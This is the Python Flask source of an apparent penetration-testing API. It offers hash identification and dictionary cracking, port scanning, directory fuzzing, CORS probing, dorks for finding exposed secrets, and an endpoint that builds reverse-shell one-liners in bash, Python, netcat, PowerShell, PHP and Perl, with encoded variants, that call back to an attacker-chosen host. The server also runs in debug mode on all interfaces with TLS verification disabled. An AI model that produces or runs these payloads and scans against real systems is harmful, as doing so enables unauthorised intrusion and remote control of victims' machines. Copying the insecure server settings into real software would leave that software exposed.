import os
import re
import math
import time
import socket
import base64
import urllib.parse
import json
import hashlib
import ipaddress
import hmac
import ssl
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# Helper: safe timeout request
def safe_fetch(url, method="GET", headers=None, timeout=4):
    if not headers:
        headers = {"User-Agent": "NexusSec-MobilePentest/1.0"}
    try:
        if method == "GET":
            res = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True, verify=False)
        elif method == "HEAD":
            res = requests.head(url, headers=headers, timeout=timeout, allow_redirects=True, verify=False)
        elif method == "OPTIONS":
            res = requests.options(url, headers=headers, timeout=timeout, allow_redirects=True, verify=False)
        else:
            res = requests.request(method, url, headers=headers, timeout=timeout, allow_redirects=True, verify=False)
        return res
    except Exception as e:
        return str(e)

# -------------------------------------------------------------
# 1. HASH & PASSWORD ENDPOINTS
# -------------------------------------------------------------

COMMON_HASH_TYPES = [
    {"name": "MD5", "len": 32, "regex": r"^[a-fA-F0-9]{32}$", "hashcat": "0", "john": "raw-md5"},
    {"name": "NTLM / MD4", "len": 32, "regex": r"^[a-fA-F0-9]{32}$", "hashcat": "1000", "john": "nt"},
    {"name": "SHA-1", "len": 40, "regex": r"^[a-fA-F0-9]{40}$", "hashcat": "100", "john": "raw-sha1"},
    {"name": "MySQL4.1 / MySQL5", "len": 41, "regex": r"^\*[a-fA-F0-9]{40}$", "hashcat": "300", "john": "mysql-sha1"},
    {"name": "SHA-224", "len": 56, "regex": r"^[a-fA-F0-9]{56}$", "hashcat": "1300", "john": "raw-sha224"},
    {"name": "SHA-256", "len": 64, "regex": r"^[a-fA-F0-9]{64}$", "hashcat": "1400", "john": "raw-sha256"},
    {"name": "SHA3-256", "len": 64, "regex": r"^[a-fA-F0-9]{64}$", "hashcat": "17400", "john": "raw-sha3"},
    {"name": "SHA-384", "len": 96, "regex": r"^[a-fA-F0-9]{96}$", "hashcat": "10800", "john": "raw-sha384"},
    {"name": "SHA-512", "len": 128, "regex": r"^[a-fA-F0-9]{128}$", "hashcat": "1700", "john": "raw-sha512"},
    {"name": "Bcrypt", "len": 60, "regex": r"^\$2[ayb]\$[0-9]{2}\$[A-Za-z0-9\.\/]{53}$", "hashcat": "3200", "john": "bcrypt"},
    {"name": "Argon2", "len": None, "regex": r"^\$argon2(i|d|id)\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9\+\/]+\$[A-Za-z0-9\+\/]+$", "hashcat": "10900", "john": "argon2"},
    {"name": "JWT (JSON Web Token)", "len": None, "regex": r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$", "hashcat": "16500", "john": "jwt"},
    {"name": "CRC-32", "len": 8, "regex": r"^[a-fA-F0-9]{8}$", "hashcat": "11500", "john": "crc32"}
]

TOP_PASSWORDS = [
    "123456", "password", "123456789", "12345678", "12345", "111111", "1234567",
    "sunshine", "qwerty", "iloveyou", "princess", "admin", "welcome", "secret",
    "monkey", "shadow", "master", "666666", "football", "letmein", "dragon",
    "superman", "pussycat", "trustno1", "baseball", "solo", "dude", "test",
    "root", "toor", "pass", "123123", "abc123", "password123", "admin123"
]

@app.route("/api/hash/generate", methods=["POST"])
def hash_generate():
    data = request.json or {}
    text = data.get("text", "")
    salt = data.get("salt", "")
    secret = data.get("secret", "")

    start_time = time.time()
    raw = (salt + text).encode("utf-8")

    md5_val = hashlib.md5(raw).hexdigest()
    sha1_val = hashlib.sha1(raw).hexdigest()
    sha256_val = hashlib.sha256(raw).hexdigest()
    sha512_val = hashlib.sha512(raw).hexdigest()
    sha3_256 = hashlib.sha3_256(raw).hexdigest()
    
    # NTLM
    try:
        ntlm_val = hashlib.new('md4', text.encode('utf-16le')).hexdigest()
    except Exception:
        ntlm_val = "N/A (MD4 not supported)"

    # HMAC SHA256 if secret provided
    hmac_val = ""
    if secret:
        hmac_val = hmac.new(secret.encode('utf-8'), text.encode('utf-8'), hashlib.sha256).hexdigest()

    duration_ms = round((time.time() - start_time) * 1000, 3)

    return jsonify({
        "input": text,
        "salt": salt,
        "time_ms": duration_ms,
        "hashes": {
            "MD5": md5_val,
            "SHA1": sha1_val,
            "SHA256": sha256_val,
            "SHA512": sha512_val,
            "SHA3-256": sha3_256,
            "NTLM": ntlm_val,
            "HMAC-SHA256": hmac_val if secret else "Provide Secret Key to calculate HMAC"
        }
    })

@app.route("/api/hash/identify", methods=["POST"])
def hash_identify():
    data = request.json or {}
    hash_str = data.get("hash", "").strip()
    length = len(hash_str)

    matches = []
    for item in COMMON_HASH_TYPES:
        if item["len"] is not None and item["len"] != length:
            continue
        if re.match(item["regex"], hash_str):
            matches.append({
                "name": item["name"],
                "hashcat_mode": item["hashcat"],
                "john_format": item["john"],
                "confidence": "High" if item["len"] == length else "Medium"
            })

    return jsonify({
        "hash": hash_str,
        "length": length,
        "matched_count": len(matches),
        "matches": matches if matches else [{"name": "Unknown / Custom Hash Format", "confidence": "Low", "hashcat_mode": "N/A", "john_format": "N/A"}]
    })

@app.route("/api/hash/crack_lookup", methods=["POST"])
def hash_crack_lookup():
    data = request.json or {}
    hash_str = data.get("hash", "").strip().lower()
    custom_words = data.get("wordlist", [])

    candidates = list(set(TOP_PASSWORDS + custom_words))
    
    found = None
    hash_type = None

    for word in candidates:
        w_bytes = word.encode('utf-8')
        if hashlib.md5(w_bytes).hexdigest() == hash_str:
            found = word
            hash_type = "MD5"
            break
        if hashlib.sha1(w_bytes).hexdigest() == hash_str:
            found = word
            hash_type = "SHA1"
            break
        if hashlib.sha256(w_bytes).hexdigest() == hash_str:
            found = word
            hash_type = "SHA256"
            break
        if hashlib.sha512(w_bytes).hexdigest() == hash_str:
            found = word
            hash_type = "SHA512"
            break

    if found:
        return jsonify({"status": "SUCCESS", "found": True, "password": found, "hash_type": hash_type})
    else:
        return jsonify({"status": "NOT_FOUND", "found": False, "searched_words": len(candidates), "message": f"Hash not in top dictionary ({len(candidates)} words tested). Try John or Hashcat."})

@app.route("/api/password/analyze", methods=["POST"])
def password_analyze():
    data = request.json or {}
    pwd = data.get("password", "")

    if not pwd:
        return jsonify({"error": "Password required"}), 400

    length = len(pwd)
    has_lower = bool(re.search(r"[a-z]", pwd))
    has_upper = bool(re.search(r"[A-Z]", pwd))
    has_digit = bool(re.search(r"[0-9]", pwd))
    has_symbol = bool(re.search(r"[^a-zA-Z0-9]", pwd))

    charset_size = 0
    if has_lower: charset_size += 26
    if has_upper: charset_size += 26
    if has_digit: charset_size += 10
    if has_symbol: charset_size += 32

    combinations = (charset_size ** length) if charset_size > 0 else 0
    entropy = math.log2(combinations) if combinations > 0 else 0

    # Crack times (100 Billion hashes/sec GPU array vs 1 Billion/sec single GPU)
    hashes_per_sec_fast = 100_000_000_000 # 100 GH/s
    hashes_per_sec_slow = 1_000_000_000   # 1 GH/s

    seconds_fast = combinations / hashes_per_sec_fast if hashes_per_sec_fast > 0 else 0
    seconds_slow = combinations / hashes_per_sec_slow if hashes_per_sec_slow > 0 else 0

    def format_time(s):
        if s < 0.001: return "Instant (< 1 millisecond)"
        if s < 1: return f"{round(s*1000, 1)} milliseconds"
        if s < 60: return f"{round(s, 1)} seconds"
        if s < 3600: return f"{round(s/60, 1)} minutes"
        if s < 86400: return f"{round(s/3600, 1)} hours"
        if s < 31536000: return f"{round(s/86400, 1)} days"
        if s < 31536000 * 1000: return f"{round(s/31536000, 1)} years"
        return "Centuries / Uncrackable brute-force"

    # Strength Score 0-100
    score = min(100, int((entropy / 80) * 100))
    rating = "Very Weak"
    if score >= 80: rating = "Strong / Robust"
    elif score >= 60: rating = "Good"
    elif score >= 40: rating = "Moderate"
    elif score >= 20: rating = "Weak"

    warnings = []
    if pwd.lower() in TOP_PASSWORDS:
        warnings.append("⚠️ Password is in top common dictionary database!")
        score = 5
        rating = "CRITICAL WEAKNESS"
    if length < 8:
        warnings.append("Length is under 8 characters.")
    if not has_upper:
        warnings.append("Missing uppercase letters.")
    if not has_digit:
        warnings.append("Missing numbers.")
    if not has_symbol:
        warnings.append("Missing special symbols.")

    return jsonify({
        "password": pwd,
        "length": length,
        "entropy_bits": round(entropy, 2),
        "charset_pool_size": charset_size,
        "score": score,
        "rating": rating,
        "crack_time_rig": format_time(seconds_fast),
        "crack_time_single_gpu": format_time(seconds_slow),
        "flags": {
            "has_lower": has_lower,
            "has_upper": has_upper,
            "has_digit": has_digit,
            "has_symbol": has_symbol
        },
        "warnings": warnings
    })

# -------------------------------------------------------------
# 2. WEB APP TESTING ENDPOINTS
# -------------------------------------------------------------

@app.route("/api/web/headers", methods=["POST"])
def web_headers():
    data = request.json or {}
    url = data.get("url", "").strip()

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    try:
        res = requests.get(url, timeout=5, allow_redirects=True, headers={"User-Agent": "NexusSec-WebScanner/1.0"})
        headers_dict = dict(res.headers)
        
        # Audit critical security headers
        checks = [
            {"header": "Strict-Transport-Security", "desc": "HSTS forces HTTPS connections.", "required": True},
            {"header": "Content-Security-Policy", "desc": "CSP prevents XSS and data injection.", "required": True},
            {"header": "X-Frame-Options", "desc": "Prevents Clickjacking attacks.", "required": True},
            {"header": "X-Content-Type-Options", "desc": "Prevents MIME-type sniffing (nosniff).", "required": True},
            {"header": "Referrer-Policy", "desc": "Controls referrer information leakage.", "required": False},
            {"header": "Permissions-Policy", "desc": "Restricts browser feature usage (camera, mic, etc.).", "required": False},
            {"header": "X-XSS-Protection", "desc": "Legacy XSS protection filter flag.", "required": False}
        ]

        audit = []
        passed = 0
        for item in checks:
            val = None
            for k in headers_dict.keys():
                if k.lower() == item["header"].lower():
                    val = headers_dict[k]
                    break
            
            present = val is not None
            if present: passed += 1
            audit.append({
                "header": item["header"],
                "present": present,
                "value": val if present else "Missing",
                "description": item["desc"],
                "required": item["required"]
            })

        # Server information leakage check
        server_header = headers_dict.get("Server") or headers_dict.get("X-Powered-By")
        
        return jsonify({
            "url": res.url,
            "status_code": res.status_code,
            "headers": headers_dict,
            "audit": audit,
            "score_passed": f"{passed}/{len(checks)}",
            "server_banner": server_header or "Hidden / Not Disclosed"
        })

    except Exception as e:
        return jsonify({"error": f"Failed to connect to target: {str(e)}"}), 400

@app.route("/api/web/cors", methods=["POST"])
def web_cors():
    data = request.json or {}
    url = data.get("url", "").strip()

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    try:
        evil_origin = "https://evil-attacker.com"
        headers = {
            "Origin": evil_origin,
            "User-Agent": "NexusSec-CORS-Auditor/1.0"
        }
        res = requests.options(url, headers=headers, timeout=5)
        
        allow_origin = res.headers.get("Access-Control-Allow-Origin")
        allow_credentials = res.headers.get("Access-Control-Allow-Credentials")
        allow_methods = res.headers.get("Access-Control-Allow-Methods")

        vulnerable = False
        findings = []

        if allow_origin == "*":
            findings.append("⚠️ Access-Control-Allow-Origin is set to wildcard '*'")
            vulnerable = True
        elif allow_origin == evil_origin:
            findings.append("🔥 CRITICAL: Server reflects arbitrary Origin header!")
            vulnerable = True
        
        if allow_credentials == "true":
            findings.append("⚠️ Access-Control-Allow-Credentials is true")
            if allow_origin == evil_origin:
                findings.append("🔥 CRITICAL RISK: Authenticated cross-origin request reading possible!")

        return jsonify({
            "url": url,
            "status_code": res.status_code,
            "vulnerable": vulnerable,
            "allow_origin": allow_origin or "None",
            "allow_credentials": allow_credentials or "false",
            "allow_methods": allow_methods or "Not specified",
            "findings": findings if findings else ["✅ CORS configuration appears restrictive or absent."]
        })
    except Exception as e:
        return jsonify({"error": f"CORS test failed: {str(e)}"}), 400

@app.route("/api/web/fuzz_dir", methods=["POST"])
def web_fuzz_dir():
    data = request.json or {}
    target_url = data.get("url", "").rstrip("/")
    custom_wordlist = data.get("wordlist", [])

    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "https://" + target_url

    default_paths = [
        "admin", "login", "api", "robots.txt", ".git/HEAD", ".env", "config.json",
        "swagger-ui.html", "phpmyadmin", "backup.zip", "sitemap.xml", "console", "dashboard"
    ]
    
    paths_to_test = custom_wordlist if custom_wordlist else default_paths
    results = []

    for p in paths_to_test[:15]:  # limit to 15 paths for quick responsiveness
        test_url = f"{target_url}/{p.lstrip('/')}"
        try:
            r = requests.head(test_url, timeout=3, allow_redirects=False, headers={"User-Agent": "NexusSec-DirScanner/1.0"})
            status = r.status_code
            content_type = r.headers.get("Content-Type", "")
            results.append({
                "path": f"/{p.lstrip('/')}",
                "url": test_url,
                "status": status,
                "content_type": content_type
            })
        except Exception:
            results.append({
                "path": f"/{p.lstrip('/')}",
                "url": test_url,
                "status": "ERR/Timeout",
                "content_type": "N/A"
            })

    return jsonify({"target": target_url, "scanned_count": len(results), "results": results})

# -------------------------------------------------------------
# 3. NETWORK & PORT SCANNER ENDPOINTS
# -------------------------------------------------------------

COMMON_PORTS = [
    {"port": 21, "service": "FTP"},
    {"port": 22, "service": "SSH"},
    {"port": 23, "service": "Telnet"},
    {"port": 25, "service": "SMTP"},
    {"port": 53, "service": "DNS"},
    {"port": 80, "service": "HTTP"},
    {"port": 110, "service": "POP3"},
    {"port": 139, "service": "NetBIOS"},
    {"port": 443, "service": "HTTPS"},
    {"port": 445, "service": "SMB"},
    {"port": 1433, "service": "MSSQL"},
    {"port": 3306, "service": "MySQL"},
    {"port": 3389, "service": "RDP"},
    {"port": 5432, "service": "PostgreSQL"},
    {"port": 6379, "service": "Redis"},
    {"port": 8080, "service": "HTTP-Alt"},
    {"port": 8443, "service": "HTTPS-Alt"}
]

@app.route("/api/network/portscan", methods=["POST"])
def port_scan():
    data = request.json or {}
    target = data.get("target", "").strip()
    selected_ports = data.get("ports", [])

    if not target:
        return jsonify({"error": "Target IP or hostname required"}), 400

    # Resolve domain to IP
    try:
        ip = socket.gethostbyname(target)
    except Exception as e:
        return jsonify({"error": f"Cannot resolve target hostname '{target}': {str(e)}"}), 400

    ports_to_scan = selected_ports if selected_ports else [p["port"] for p in COMMON_PORTS]
    
    results = []
    open_count = 0

    for port in ports_to_scan[:20]: # scan up to 20 ports per call
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.2)
        start_t = time.time()
        conn_res = s.connect_ex((ip, int(port)))
        latency_ms = round((time.time() - start_t) * 1000, 1)

        service_name = next((p["service"] for p in COMMON_PORTS if p["port"] == int(port)), "Unknown")
        banner = ""

        if conn_res == 0:
            open_count += 1
            # Try to grab banner
            try:
                s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                banner_raw = s.recv(256).decode("utf-8", errors="ignore").strip()
                banner = banner_raw.split("\r\n")[0] if banner_raw else "Open"
            except Exception:
                banner = "Open (No Banner)"
            
            results.append({
                "port": port,
                "status": "OPEN",
                "service": service_name,
                "banner": banner,
                "latency_ms": latency_ms
            })
        else:
            results.append({
                "port": port,
                "status": "CLOSED / FILTERED",
                "service": service_name,
                "banner": "-",
                "latency_ms": latency_ms
            })
        s.close()

    return jsonify({
        "target": target,
        "resolved_ip": ip,
        "total_scanned": len(results),
        "open_count": open_count,
        "results": results
    })

@app.route("/api/network/subnet", methods=["POST"])
def subnet_calculator():
    data = request.json or {}
    cidr = data.get("cidr", "").strip()

    if not cidr:
        return jsonify({"error": "CIDR subnet required (e.g., 192.168.1.0/24)"}), 400

    try:
        net = ipaddress.ip_network(cidr, strict=False)
        total_hosts = net.num_addresses
        usable_hosts = total_hosts - 2 if total_hosts > 2 else total_hosts

        first_host = net.network_address + 1 if total_hosts > 2 else net.network_address
        last_host = net.broadcast_address - 1 if total_hosts > 2 else net.broadcast_address

        return jsonify({
            "cidr": str(net),
            "network_address": str(net.network_address),
            "netmask": str(net.netmask),
            "wildcard_mask": str(net.hostmask),
            "broadcast_address": str(net.broadcast_address),
            "first_usable_ip": str(first_host),
            "last_usable_ip": str(last_host),
            "total_hosts": total_hosts,
            "usable_hosts": usable_hosts,
            "is_private": net.is_private,
            "binary_netmask": "".join([bin(int(x))[2:].zfill(8) for x in str(net.netmask).split(".")])
        })
    except Exception as e:
        return jsonify({"error": f"Invalid CIDR format: {str(e)}"}), 400

@app.route("/api/network/dns", methods=["POST"])
def dns_lookup():
    data = request.json or {}
    domain = data.get("domain", "").strip()

    if not domain:
        return jsonify({"error": "Domain name required"}), 400

    # Strip http/https prefix if present
    domain = re.sub(r"^https?://", "", domain).split("/")[0]

    records = {}
    try:
        # A record
        records["A"] = [ip[4][0] for ip in socket.getaddrinfo(domain, None, socket.AF_INET)]
    except Exception:
        records["A"] = []

    try:
        # AAAA record
        records["AAAA"] = [ip[4][0] for ip in socket.getaddrinfo(domain, None, socket.AF_INET6)]
    except Exception:
        records["AAAA"] = []

    return jsonify({"domain": domain, "records": records})

# -------------------------------------------------------------
# 4. ENCODER / DECODER ENDPOINTS
# -------------------------------------------------------------

@app.route("/api/encoder/convert", methods=["POST"])
def encoder_convert():
    data = request.json or {}
    text = data.get("text", "")
    mode = data.get("mode", "encode") # 'encode' or 'decode'
    format_type = data.get("format", "base64")

    output = ""
    error = None

    try:
        if format_type == "base64":
            if mode == "encode":
                output = base64.b64encode(text.encode("utf-8")).decode("utf-8")
            else:
                output = base64.b64decode(text.encode("utf-8")).decode("utf-8")

        elif format_type == "hex":
            if mode == "encode":
                output = text.encode("utf-8").hex()
            else:
                output = bytes.fromhex(text.strip()).decode("utf-8")

        elif format_type == "url":
            if mode == "encode":
                output = urllib.parse.quote(text)
            else:
                output = urllib.parse.unquote(text)

        elif format_type == "html":
            if mode == "encode":
                output = "".join([f"&#{ord(c)};" for c in text])
            else:
                import html
                output = html.unescape(text)

        elif format_type == "binary":
            if mode == "encode":
                output = " ".join(format(ord(x), "08b") for x in text)
            else:
                bits = text.split()
                output = "".join([chr(int(b, 2)) for b in bits])

        elif format_type == "rot13":
            import codecs
            output = codecs.encode(text, "rot_13")

        elif format_type == "reverse":
            output = text[::-1]

    except Exception as e:
        error = str(e)

    return jsonify({
        "input": text,
        "mode": mode,
        "format": format_type,
        "output": output,
        "error": error
    })

@app.route("/api/encoder/jwt", methods=["POST"])
def jwt_decode():
    data = request.json or {}
    token = data.get("token", "").strip()

    if not token or token.count(".") != 2:
        return jsonify({"error": "Invalid JWT token structure (must contain 2 dots: header.payload.signature)"}), 400

    try:
        parts = token.split(".")
        def pad_b64(s):
            return s + "=" * (-len(s) % 4)

        header_json = json.loads(base64.urlsafe_b64decode(pad_b64(parts[0])).decode("utf-8"))
        payload_json = json.loads(base64.urlsafe_b64decode(pad_b64(parts[1])).decode("utf-8"))
        signature_hex = parts[2]

        # Expiry check
        exp = payload_json.get("exp")
        exp_formatted = None
        is_expired = None
        if exp and isinstance(exp, (int, float)):
            exp_date = time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(exp))
            is_expired = time.time() > exp
            exp_formatted = exp_date

        return jsonify({
            "token": token,
            "header": header_json,
            "payload": payload_json,
            "signature": signature_hex,
            "exp_date": exp_formatted,
            "is_expired": is_expired
        })
    except Exception as e:
        return jsonify({"error": f"Failed to parse JWT token: {str(e)}"}), 400

# -------------------------------------------------------------
# 5. OSINT & PAYLOAD ENDPOINTS
# -------------------------------------------------------------

USERNAME_PLATFORMS = [
    {"name": "GitHub", "url": "https://github.com/{username}"},
    {"name": "Twitter / X", "url": "https://x.com/{username}"},
    {"name": "Reddit", "url": "https://www.reddit.com/user/{username}"},
    {"name": "Instagram", "url": "https://www.instagram.com/{username}"},
    {"name": "HackerNews", "url": "https://news.ycombinator.com/user?id={username}"},
    {"name": "Telegram", "url": "https://t.me/{username}"},
    {"name": "DockerHub", "url": "https://hub.docker.com/u/{username}"},
    {"name": "Medium", "url": "https://medium.com/@{username}"},
    {"name": "Steam", "url": "https://steamcommunity.com/id/{username}"},
    {"name": "GitLab", "url": "https://gitlab.com/{username}"}
]

@app.route("/api/osint/username", methods=["POST"])
def osint_username():
    data = request.json or {}
    username = data.get("username", "").strip()

    if not username:
        return jsonify({"error": "Username required"}), 400

    results = []
    for platform in USERNAME_PLATFORMS:
        profile_url = platform["url"].format(username=username)
        results.append({
            "platform": platform["name"],
            "url": profile_url,
            "check_status": "Search Query Ready"
        })

    return jsonify({"username": username, "total_platforms": len(results), "platforms": results})

@app.route("/api/osint/dorks", methods=["POST"])
def osint_dorks():
    data = request.json or {}
    target_domain = data.get("domain", "example.com").strip()

    dorks = [
        {"category": "Exposed Config & Secrets", "query": f'site:{target_domain} ext:env OR ext:yaml OR ext:ini OR filename:config'},
        {"category": "Exposed Log Files", "query": f'site:{target_domain} ext:log OR ext:txt "error" OR "password"'},
        {"category": "Database Backups", "query": f'site:{target_domain} ext:sql OR ext:db OR ext:tar OR ext:zip'},
        {"category": "Admin & Portal Login Pages", "query": f'site:{target_domain} inurl:admin OR inurl:login OR inurl:dashboard'},
        {"category": "Directory Indexing Leaks", "query": f'site:{target_domain} intitle:"index of /"'},
        {"category": "Public S3 / Cloud Buckets", "query": f'site:s3.amazonaws.com "{target_domain}"'},
        {"category": "API Keys & Tokens", "query": f'site:{target_domain} "api_key" OR "access_token" OR "bearer"'},
        {"category": "Subdomain Discovery", "query": f'site:*.{target_domain} -www'}
    ]

    for item in dorks:
        item["google_url"] = f"https://www.google.com/search?q={urllib.parse.quote(item['query'])}"

    return jsonify({"target_domain": target_domain, "dorks": dorks})

@app.route("/api/payloads/generate_revshell", methods=["POST"])
def generate_revshell():
    data = request.json or {}
    lhost = data.get("lhost", "10.10.14.5").strip()
    lport = str(data.get("lport", "4444")).strip()
    shell_type = data.get("shell_type", "/bin/bash").strip()

    payloads = [
        {
            "name": "Bash -i",
            "cmd": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "os": "Linux"
        },
        {
            "name": "Python 3 Socket",
            "cmd": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("{shell_type}")\'',
            "os": "Linux/Mac"
        },
        {
            "name": "Netcat -e",
            "cmd": f"nc -e {shell_type} {lhost} {lport}",
            "os": "Linux"
        },
        {
            "name": "Netcat FIFO (Ncat)",
            "cmd": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_type} -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "os": "Linux"
        },
        {
            "name": "PowerShell One-Liner",
            "cmd": f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
            "os": "Windows"
        },
        {
            "name": "PHP Exec",
            "cmd": f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("{shell_type} -i <&3 >&3 2>&3");\'',
            "os": "Web/Linux"
        },
        {
            "name": "Perl Reverse Shell",
            "cmd": f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell_type} -i");}};\'',
            "os": "Linux"
        }
    ]

    for p in payloads:
        p["b64"] = base64.b64encode(p["cmd"].encode("utf-8")).decode("utf-8")
        p["url_encoded"] = urllib.parse.quote(p["cmd"])

    return jsonify({"lhost": lhost, "lport": lport, "payloads": payloads})

@app.route("/api/health", methods=["GET"])
def health_check():
    return jsonify({"status": "ONLINE", "suite": "NexusSec Mobile Pentest Suite API", "version": "2.0.0"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
